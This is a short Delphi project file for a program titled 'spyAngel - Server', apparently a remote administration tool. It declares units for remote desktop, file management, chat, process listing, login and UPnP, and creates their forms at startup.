program spyAngelServer;

uses
  Forms,
  Principal in 'Principal.pas' {Form1},
  Desktop_Remoto in 'Desktop_Remoto.pas' {Form2},
  File_Manager in 'File_Manager.pas' {Form3},
  Chat in 'Chat.pas' {Form4},
  Wprocessos in 'Wprocessos.pas' {Form5},
  login in 'login.pas' {Form0},
  UPNP in 'UPNP.pas';

{$R *.res}

begin
  Application.Initialize;
  Application.Title := 'spyAngel - Server';
  Application.CreateForm(TForm1, Form1);
  Application.CreateForm(TForm0, Form0);
  Application.CreateForm(TForm2, Form2);
  Application.CreateForm(TForm3, Form3);
  Application.CreateForm(TForm4, Form4);
  Application.CreateForm(TForm5, Form5);
  Application.ShowMainForm := False;
  form0.Show;
  Application.Run;
end.
